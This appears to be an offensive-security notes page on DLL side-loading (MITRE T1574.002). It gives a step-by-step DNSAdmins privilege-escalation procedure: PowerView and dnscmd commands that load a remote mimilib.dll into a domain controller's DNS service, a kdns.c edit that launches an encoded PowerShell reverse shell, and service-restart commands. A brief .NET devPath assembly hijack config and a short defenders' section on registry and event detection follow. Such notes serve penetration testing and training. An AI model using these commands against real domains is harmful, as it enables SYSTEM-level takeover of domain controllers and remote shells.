# Hijack Execution Flow: DLL Side-Loading 

# T1574.002 - Hijack Execution Flow: DLL Side-Loading
### Attacks
* DNSAdmins DLL (PowerView, RSAT DNS, Mimikatz)
	* Overview
		* It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)
		* In case the DC also serves as DNS, this will provide us escalation to DA
		* Need privileges to restart the DNS service
			* By default, members of the DNSAdmins group do not have this privilege, though if the group is populated, an organization has probably given them this privilege
	* Process
		1. Enumerate the members of the DNSAdmins group
			* PowerView
		  
					Get-NetGroupMember -GroupName "DNSAdmins"
			* ActiveDirectory Module

					Get-ADGroupMember -Identity DNSAdmins
		1. Once we know the members of the DNSAdmins group, we need to compromise a member.
		1. From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS)
			* `dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll`
		1. Using DNSServer module (needs RSAT DNS)
			* `$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All`
			* `$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"`
			* `Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose`
		1. Here, `mimilib.dll` is configured to be usable as a valid plugin
			* The default payload mimilib provides is a file called `kiwidns.log` that is stored in the system32 directory that logs any DNS queries received by the DNS server
				* Obviously you could edit this to do something more spectacular
				* Replace `#pragma warning(pop)` section in `kdns.c` with:

						#pragma warning (pop)
						 {
						  klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
						  fclose(kdns_logfile);
						  system(C:\\Windows\System32\\WindowsPowerShell\\v1.0\\powershell.exe -e ENCODED-REVERSE-SHELL-HERE);
						 }

			* **NOTE - AS LONG AS THIS REVERSE SHELL IS ALIVE, ALL DNS QUERIES WILL FAIL - SYNCHRONOUS EXECUTION**
		1. We then need to restart the sevice
			* `sc \\dcorp-dc stop dns`
			* `sc \\dcorp-dc start dns`
			* Notes
				* IF LOADING THE PLUGIN FAILS - THE DNS SERVICE WILL NOT START
				* MAKE SURE DLL IS FULLY SHARED AND READABLE BY EVERYONE
				* MAKE SURE YOU PROVIDE THE IP OF THE MACHINE HOSTING THE DLL - IF DNS SERVER FAILS TO RESOLVE HOSTNAME - PLUGIN WILL FAIL TO LOAD

#### Defenders

* Creates a registry key at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll` with value `\\172.16.50.100\dll\mimilib.dll`
* Can also keep an eye out for the Event #770
	* Notes that a plugin DLL has been loaded from a remote location

## Global Assembly Cache Hijack Attack

### References

* BHops Article [https://bohops.com/2021/05/30/abusing-and-detecting-lolbin-usage-of-net-development-mode-features/](https://bohops.com/2021/05/30/abusing-and-detecting-lolbin-usage-of-net-development-mode-features/)

### Technique

Using the Global Assembly Cache attack, an attacker can override the lookup path for side loading a DLL on execution of the binary.

What we need:

1. Configuration file (Sample below) in the same directory as the .NET Binary we want to use (similar to the attack above)
1. Environmental Variable Set: devpath

Then we can execute the binary and have it load our DLL execution.

### Sample

Config:

```xml
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" />
  </startup>
  <runtime>
    <developmentMode developerInstallation="true"/>
  </runtime>
</configuration>
```
